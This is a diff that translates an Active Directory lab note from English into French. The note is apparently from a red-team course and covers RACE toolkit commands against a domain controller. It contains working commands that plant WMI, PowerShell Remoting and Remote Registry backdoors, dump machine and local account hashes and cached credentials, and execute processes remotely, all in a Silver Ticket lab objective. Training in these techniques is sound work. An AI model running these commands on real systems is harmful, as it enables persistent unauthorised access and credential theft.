+Les ACL WMI peuvent être modifiées pour autoriser des utilisateurs non administrateurs à accéder à des namespaces ou à des objets sécurisables.
+
+**Charger le toolkit RACE :**
+
 ```powershell
 . C:\AD\Tools\RACE-master\RACE.ps1
 ```
 
-**On local machine for student1**:
+**Configurer l'accès WMI sur la machine locale pour `student1` :**
+
 ```powershell
 Set-RemoteWMI -SamAccountName student1 -Verbose
 ```
 
-**On remote machine for student1 without explicit credentials**:
+**Configurer l'accès WMI sur une machine distante sans identifiants explicites :**
+
 ```powershell
-Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
 ```
 
-**On remote machine with explicit credentials. Only root\cimv2 and nested namespaces**:
+**Configurer l'accès WMI sur une machine distante avec des identifiants explicites :**
+
+Les notes limitent cet exemple au namespace `root\cimv2` et à ses namespaces imbriqués.
+
 ```powershell
-Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose
+Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -Namespace 'root\cimv2' -Verbose
 ```
 
-**On remote machine remove permissions**:
+**Retirer les permissions WMI sur la machine distante :**
+
 ```powershell
-Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
+Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose
 ```
 
-example of code execution with WMI:
+**Exemples d'interaction WMI :**
+
+Le premier exemple crée un processus distant. Le second interroge les informations du système d'exploitation.
+
 ```powershell
-Invoke-WmiMethod -Class win32_process -Name Create -ArgumentList ‘calc.exe’ -ComputerName dcorp-dc
+Invoke-WmiMethod -Class win32_process -Name Create -ArgumentList 'calc.exe' -ComputerName dcorp-dc
 gwmi -Class win32_operatingsystem -ComputerName dcorp-dc
 ```
 
-## PowerShell Remoting
+### PowerShell Remoting
 
-> Using the RACE toolkit - PS Remoting backdoor not stable after August 2020 patches
+Le toolkit RACE permet de modifier les permissions associées à PowerShell Remoting. Les notes signalent que cette méthode de backdoor n'est plus stable après les correctifs d'août 2020.
 
-**On local machine for student1**:
+**Configurer PowerShell Remoting sur la machine locale pour `student1` :**
+
 ```powershell
 Set-RemotePSRemoting -SamAccountName student1 -Verbose
 ```
 
-**On remote machine for student1 without credentials**:
+**Configurer PowerShell Remoting sur une machine distante :**
+
 ```powershell
 Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose
 ```
 
-**On remote machine, remove the permissions**:
+**Retirer les permissions PowerShell Remoting :**
+
 ```powershell
 Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove
 ```
 
+### Remote Registry
 
-## Remote Registry
+RACE ou DAMP peuvent être utilisés pour configurer un accès au Remote Registry. L'exemple nécessite des privilèges administrateur sur la machine distante.
 
-**Using RACE or DAMP, with admin privs on remote machine**:
+**Configurer l'accès Remote Registry pour `student1` :**
+
 ```powershell
 Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
 ```
 
-**As student1, retrieve machine account hash**:
+**Récupérer le hash du compte machine :**
+
 ```powershell
 Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
 ```
 
-**Retrieve local account hash**:
+**Récupérer les hashes des comptes locaux :**
+
 ```powershell
 Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
 ```
 
-**Retrieve domain cached credentials**:
+**Récupérer les identifiants mis en cache du domaine :**
+
 ```powershell
 Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
 ```
 
+**Objectif du laboratoire 13**
 
-Learning Objective 13
-
-- Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
-- Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.
-
+- Modifier les Security Descriptors de `dcorp-dc` pour étudier l'accès à PowerShell Remoting et WMI sans privilèges administrateur.
+- Récupérer le hash du compte machine du Domain Controller et étudier son utilisation dans un Silver Ticket pour accéder à WMI.
